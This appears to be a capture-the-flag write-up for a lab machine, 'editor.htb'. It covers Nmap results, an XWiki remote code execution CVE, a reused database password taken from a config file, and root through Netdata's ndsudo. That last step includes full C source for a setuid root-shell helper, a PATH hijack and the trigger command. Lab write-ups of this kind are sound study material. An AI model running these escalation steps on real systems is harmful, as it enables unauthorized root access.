
**IP:** `10.10.11.80`  

---

##  OS / Technology
- Ubuntu  
- XWiki 15.10.8 (Debian package)  

---

##  Users / Passwords
- Neal Bagwell (?)  
- oliver : *discovered later via MySQL credentials*  

---

##  Services
- **80 (HTTP)** → Hostname: `http://editor.htb/` → source code only, FUZZ → nothing  
- **8080 (HTTP)** → XWiki page, version 15.10.8  
- **22 (SSH)** → running  

---

##  Nmap
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
```

---

##  Exploitation
**XWiki 15.10.8 → CVE-2025-24893 (RCE)**  
- Exploit: [gunzf0x/CVE-2025-24893](https://github.com/gunzf0x/CVE-2025-24893)  
- Gained shell as xwiki user.  

---

##  Privilege Escalation – Step 1
### Enumeration
- `ss -tupln` shows services:
  - MySQL on `127.0.0.1:3306`  
  - Netdata on `127.0.0.1:19999`  
  - Java Jetty on `8080`  
- Found config file with **MySQL credentials**:
  ```xml
  <property name="hibernate.connection.username">xwiki</property>
  <property name="hibernate.connection.password">theEd1t0rTeam99</property>
  ```
- Logged into MySQL with `xwiki:theEd1t0rTeam99`.  
- No useful hashes, but reused password worked for **SSH as oliver**.  

---

## Privilege Escalation – Step 2
- Now `oliver` user:  
  ```bash
  id
  uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
  ```
- Belongs to **netdata group** → exploitable CVE.  

---

##  Exploit – CVE-2024-32019 (Netdata `ndsudo`)
1. Wrote and compiled privilege escalation helper:
   ```c
   #include <stdio.h>
   #include <stdlib.h>
   #include <unistd.h>

   int main() {
       setuid(0);
       setgid(0);
       execl("/bin/bash", "bash", "-p", (char *)NULL);
       perror("execl");
       return 1;
   }
   ```
   ```bash
   gcc -o /tmp/rootshell rootshell.c
   export PATH=/tmp:$PATH
   ```

2. Triggered Netdata `ndsudo` with arbitrary command:  
   ```bash
   /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo arcconf-pd-info
   ```

3. Escalated to **root**   
